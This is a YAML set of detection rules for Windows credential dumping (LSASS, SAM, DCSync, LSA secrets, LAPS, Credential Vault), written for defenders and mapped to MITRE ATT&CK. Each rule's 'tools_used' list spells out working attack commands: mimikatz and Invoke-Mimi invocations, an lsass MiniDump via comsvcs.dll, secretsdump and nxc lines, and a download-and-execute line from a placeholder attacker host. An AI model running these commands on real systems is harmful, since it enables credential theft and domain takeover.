title: AdStrike - Credential Dumping Detection Rules
id: sast-credump-001
status: production
description: |
  SAST detection rules for credential dumping techniques including
  LSASS memory access, SAM/NTDS extraction, DCSync, Mimikatz variants,
  Invoke-Mimi, LSA secrets, DPAPI, LAPS, and Credential Manager vault.
author: AdStrike SAST Module
date: 2026-04-24
mitre_attack:
  - T1003.001  # LSASS Memory
  - T1003.002  # Security Account Manager
  - T1003.003  # NTDS
  - T1003.004  # LSA Secrets
  - T1003.005  # Cached Domain Credentials
  - T1555.004  # Windows Credential Manager

rules:
# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE: LSASS Memory Dumping  (T1003.001)
# ─────────────────────────────────────────────────────────────────────────────
  - id: credump-lsass-001
    title: LSASS Memory Access — Credential Extraction
    technique: T1003.001
    severity: critical
    description: >
      Detects attempts to read LSASS process memory for credential extraction.
      Covers Mimikatz, lsassy, nanodump, PPLdump, and SafetyKatz techniques.
    event_sources:
      - windows_security_eventlog:
          event_ids: [4656, 4663]
          conditions:
            - field: ObjectName
              contains: "lsass.exe"
            - field: AccessMask
              values: ["0x10", "0x1010", "0x1410", "0x143A"]
      - sysmon_eventlog:
          event_ids: [10]  # ProcessAccess
          conditions:
            - field: TargetImage
              endswith: "\\lsass.exe"
            - field: GrantedAccess
              values:
                - "0x1010"  # PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
                - "0x1410"  # PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | SYNCHRONIZE
                - "0x143a"
                - "0x40"    # PROCESS_DUP_HANDLE (for handle duplication)
    process_indicators:
      - process_name: "mimikatz.exe"
        command_contains: ["sekurlsa::logonpasswords", "sekurlsa::ekeys"]
      - process_name: "procdump.exe"
        command_contains: ["-ma", "lsass"]
      - process_name: "nanodump.exe"
      - process_name: "comsvcs.dll"
        parent_process: "rundll32.exe"
        command_contains: ["MiniDump", "lsass"]
    detection:
      sigma_condition: |
        (EventID=10 AND TargetImage ENDSWITH "lsass.exe"
         AND GrantedAccess IN ["0x1010","0x1410","0x143a"])
        AND (SourceImage NOT IN trusted_security_tools_list)
      anomaly_indicators:
        - LSASS accessed by non-system process
        - rundll32.exe spawning MiniDump
        - procdump.exe targeting lsass
        - comsvcs.dll loaded by rundll32 for memory dump
    tools_used:
      - "mimikatz sekurlsa::logonpasswords"
      - "mimikatz sekurlsa::ekeys"
      - "C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit"
      - "Invoke-Mimi -Command '\"sekurlsa::logonpasswords\"'"
      - "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {lsass_pid} C:\\lsass.dmp full"
      - "nxc smb {dc} -u {user} -p {pass} -M lsassy"
      - "lsassy -d {dom} -u {user} -p {pass} {dc}"
    false_positives:
      - Security products (EDR, AV) legitimately access LSASS
      - Crash dump collection by Windows Error Reporting
    remediation:
      - Enable RunAsPPL (Protected Process Light) for LSASS
      - Deploy Credential Guard (virtualizes LSASS — no NTLM hashes in memory)
      - Block procdump.exe and nanodump.exe via AppLocker/WDAC
      - Monitor Sysmon Event ID 10 for LSASS access
      - Enable "Audit Kernel Object" in Advanced Audit Policy

  - id: credump-lsass-invoke-mimi-001
    title: Invoke-Mimi PowerShell In-Memory Credential Dump
    technique: T1003.001
    severity: critical
    description: >
      Detects Invoke-Mimi (PowerShell in-memory Mimikatz) execution for
      credential dumping. No binary written to disk — loaded via DownloadString.
    event_sources:
      - powershell_eventlog:
          event_ids: [4103, 4104]  # Module logging, Script block logging
    detection:
      sigma_condition: |
        EventID=4104 AND ScriptBlockText CONTAINS ANY [
          "Invoke-Mimi",
          "sekurlsa::logonpasswords",
          "sekurlsa::ekeys",
          "lsadump::dcsync",
          "lsadump::lsa",
          "vault::cred",
          "kerberos::golden",
          "kerberos::ptt"
        ]
    process_indicators:
      - powershell.exe
        command_contains:
          - "Invoke-Mimi"
          - "DownloadString.*Invoke-Mimi"
          - "iex.*Invoke-Mimi"
    tools_used:
      - "iex ((New-Object Net.WebClient).DownloadString('http://{attacker}/Invoke-Mimi.ps1'))"
      - "Invoke-Mimi -Command '\"sekurlsa::logonpasswords\"'"
      - "Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
      - "Invoke-Mimi -Command '\"lsadump::dcsync /user:{dom}\\krbtgt\"'"
    remediation:
      - Enable PowerShell Script Block Logging (GPO)
      - Enable PowerShell Module Logging
      - Use Constrained Language Mode (CLM) for PowerShell
      - Enable AMSI — detect Mimikatz command strings in PS sessions
      - Deploy Microsoft Defender for Identity Invoke-Mimi signature

# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE: SAM Database Dumping  (T1003.002)
# ─────────────────────────────────────────────────────────────────────────────
  - id: credump-sam-001
    title: SAM Registry Hive Access — Local Account Hash Extraction
    technique: T1003.002
    severity: high
    description: >
      Detects access to SAM registry hive for local account credential extraction.
      impacket-secretsdump uses remote registry service; reg save copies hive.
    event_sources:
      - windows_security_eventlog:
          event_ids: [4656, 4663]
          conditions:
            - field: ObjectName
              values:
                - "\\REGISTRY\\MACHINE\\SAM"
                - "\\REGISTRY\\MACHINE\\SECURITY"
                - "\\REGISTRY\\MACHINE\\SYSTEM"
      - system_eventlog:
          event_ids: [7036]
          conditions:
            - field: ServiceName
              value: "RemoteRegistry"
            - field: State
              value: "running"
    detection:
      sigma_condition: |
        (EventID=4656 AND ObjectName IN [
          "\\REGISTRY\\MACHINE\\SAM",
          "\\REGISTRY\\MACHINE\\SECURITY",
          "\\REGISTRY\\MACHINE\\SYSTEM"
        ] AND SubjectUserName NOT IN ["SYSTEM", "LOCAL SERVICE"])
        OR
        (ProcessName ENDSWITH "reg.exe" AND CommandLine CONTAINS "save" AND
         CommandLine CONTAINS ANY ["SAM","SYSTEM","SECURITY"])
    tools_used:
      - "impacket-secretsdump {dom}/{user}:{pass}@{dc} -sam -system -outputfile /tmp/sam_dump"
      - "reg save HKLM\\SAM C:\\sam.save"
      - "reg save HKLM\\SYSTEM C:\\system.save"
      - "impacket-secretsdump -sam C:\\sam.save -system C:\\system.save LOCAL"
    remediation:
      - Restrict remote registry access via Group Policy
      - Monitor RemoteRegistry service start events
      - Alert on SAM/SECURITY hive access by non-SYSTEM accounts

# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE: NTDS.dit Extraction via DCSync  (T1003.003)
# ─────────────────────────────────────────────────────────────────────────────
  - id: credump-ntds-dcsync-001
    title: DCSync — Replication-Based NTDS Hash Extraction
    technique: T1003.003
    severity: critical
    description: >
      DCSync mimics DC replication to extract password hashes without touching
      NTDS.dit file. Requires DS-Replication-Get-Changes-All privilege.
      Used by impacket-secretsdump and mimikatz lsadump::dcsync.
    event_sources:
      - windows_security_eventlog:
          event_ids: [4662]
          conditions:
            - field: Properties
              contains_any:
                - "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
                - "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All
                - "89e95b76-444d-4c62-991a-0facbeda640c"  # DS-Replication-Get-Changes-In-Filtered-Set
            - field: AccessMask
              value: "0x100"
    detection:
      sigma_condition: |
        EventID=4662 AND
        Properties CONTAINS ANY [
          "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
          "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
          "89e95b76-444d-4c62-991a-0facbeda640c"
        ] AND
        SubjectDomainName != Machine_Account AND
        SubjectUserName NOT IN DC_Computer_Accounts_List
      critical_rule: |
        # Replication from non-DC machine = DCSync attack
        IF source_host NOT IN domain_controllers_list AND event=4662 AND replication_properties THEN alert=CRITICAL
    tools_used:
      - "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm -outputfile /tmp/ntds_hashes"
      - "mimikatz lsadump::dcsync /user:{dom}\\krbtgt"
      - "mimikatz lsadump::dcsync /all /csv"
      - "Invoke-Mimi -Command '\"lsadump::dcsync /user:{dom}\\krbtgt\"'"
    false_positives:
      - Legitimate DC replication (between domain controllers)
      - Azure AD Connect sync (specific service account)
    remediation:
      - Audit DS-Replication-Get-Changes ACE on domain object
      - Alert on 4662 with replication GUIDs from non-DC sources
      - Deploy Microsoft Defender for Identity DCSync detection
      - Restrict DA-level accounts from unauthorized machines
    references:
      - https://attack.mitre.org/techniques/T1003/003/

# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE: LSA Secrets  (T1003.004)
# ─────────────────────────────────────────────────────────────────────────────
  - id: credump-lsa-secrets-001
    title: LSA Secrets Extraction via Remote Registry
    technique: T1003.004
    severity: high
    description: >
      LSA Secrets store service account credentials, DPAPI master keys, and
      cached domain credentials. Accessible via SECURITY hive or remote
      secretsdump with SYSTEM privileges.
    event_sources:
      - windows_security_eventlog:
          event_ids: [4656, 4663]
          conditions:
            - field: ObjectName
              contains: "\\REGISTRY\\MACHINE\\SECURITY\\Policy\\Secrets"
    tools_used:
      - "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-user SYSTEM"
      - "impacket-secretsdump {dom}/{user}:{pass}@{dc} -outputfile /tmp/full_dump"
    remediation:
      - Enable LSA Protection (PPL for LSA process)
      - Restrict remote registry access
      - Monitor access to SECURITY registry hive

# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE: LAPS Password Reading  (T1552.006)
# ─────────────────────────────────────────────────────────────────────────────
  - id: credump-laps-001
    title: LAPS Password — ms-Mcs-AdmPwd Attribute Read
    technique: T1552.006
    severity: high
    description: >
      Detects unauthorized reading of LAPS (Local Administrator Password Solution)
      attribute ms-Mcs-AdmPwd from Active Directory. Reading this attribute
      provides local admin credentials for managed computers.
    event_sources:
      - windows_security_eventlog:
          event_ids: [4662]
          conditions:
            - field: Properties
              contains: "ms-Mcs-AdmPwd"
    detection:
      sigma_condition: |
        EventID=4662 AND Properties CONTAINS "ms-Mcs-AdmPwd" AND
        SubjectUserName NOT IN ["SYSTEM", laps_service_account]
    tools_used:
      - "nxc ldap {dc} -u {user} -p {pass} -d {dom} -M laps"
      - "nxc smb {dc} -u {user} -p {pass} -d {dom} -M laps"
      - "ldapsearch -b '{base_dn}' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn"
    remediation:
      - Enable LAPS audit logging
      - Restrict ms-Mcs-AdmPwd read permissions to authorized accounts only
      - Migrate to Windows LAPS (newer, more secure)

# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE: sekurlsa::ekeys — AES Key Extraction  (T1003.001)
# ─────────────────────────────────────────────────────────────────────────────
  - id: credump-ekeys-001
    title: AES Encryption Key Extraction — sekurlsa::ekeys
    technique: T1003.001
    severity: critical
    description: >
      Extraction of AES128/AES256 Kerberos encryption keys from LSASS.
      Keys enable Overpass-the-Hash (Pass-the-Key), Silver Ticket, and
      S4U2Self attacks without needing plaintext passwords.
    detection:
      sigma_condition: |
        EventID=4104 AND ScriptBlockText CONTAINS "sekurlsa::ekeys"
        OR (EventID=10 AND TargetImage ENDSWITH "lsass.exe"
            AND SourceImage CONTAINS "SafetyKatz")
    tools_used:
      - "mimikatz sekurlsa::ekeys"
      - "Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
      - "C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit"
    remediation:
      - Enable Credential Guard (makes AES keys unavailable in user-mode LSASS)
      - Enable LSASS PPL protection (RunAsPPL)
      - Audit Loader.exe / SafetyKatz patterns

# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE: Windows Credential Manager  (T1555.004)
# ─────────────────────────────────────────────────────────────────────────────
  - id: credump-vault-001
    title: Windows Credential Vault Dump — vault::cred /patch
    technique: T1555.004
    severity: high
    description: >
      Dumps credentials stored in Windows Credential Manager via Mimikatz
      token::elevate + vault::cred /patch. Can extract credentials stored by
      scheduled tasks, services, and users via cmdkey.
    event_sources:
      - powershell_eventlog:
          event_ids: [4104]
    detection:
      sigma_condition: |
        EventID=4104 AND ScriptBlockText CONTAINS ANY [
          "vault::cred",
          "vault::list",
          "token::elevate",
          "PasswordVault"
        ]
    tools_used:
      - "mimikatz token::elevate vault::cred /patch"
      - "Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
      - "$vault = New-Object Windows.Security.Credentials.PasswordVault; $vault.RetrieveAll()"
    remediation:
      - Audit stored credentials (cmdkey /list)
      - Credential Guard protects domain credentials in vault
      - Restrict scheduled task credential storage

# ─────────────────────────────────────────────────────────────────────────────
# SAST CODE ANALYSIS
# ─────────────────────────────────────────────────────────────────────────────
sast_code_analysis:
  file: modules/credential_dump.py
  rules:
    - id: sast-code-credump-001
      title: Password Displayed in Secret Field — Potential Log Leak
      severity: medium
      pattern: |
        input_or_session\("password".*secret=True\)
      description: >
        Password retrieved with secret=True — good practice. Verify that
        the password value is never passed to print(), info(), or success()
        functions which may log to output files.

    - id: sast-code-credump-002
      title: Credential Output File Written to World-Readable /tmp
      severity: high
      pattern: |
        -outputfile\s+\/tmp\/
      description: >
        Credential output files written to /tmp are readable by all local users.
        Use permission-restricted paths like $HOME/ or mktemp -d.
      recommendation: "Replace /tmp/ with $HOME/.adrt_output/ or similar user-private directory"

    - id: sast-code-credump-003
      title: Attacker IP Hardcoded in Print Statement
      severity: low
      pattern: |
        SESSION\.get\("attacker_ip","<attacker>"\)
      description: >
        Default placeholder <attacker> in printed commands — operator may
        copy-paste incomplete commands. Validate attacker_ip is set before
        displaying commands.

    - id: sast-code-credump-004
      title: Shell Command with Unquoted Domain Variable
      severity: medium
      pattern: |
        f".*-d {dom}.*"
      description: >
        Domain name interpolated without quoting. If domain contains spaces
        or special characters, this could cause command failures.
      recommendation: "Use shlex.quote(dom) or wrap in single quotes"
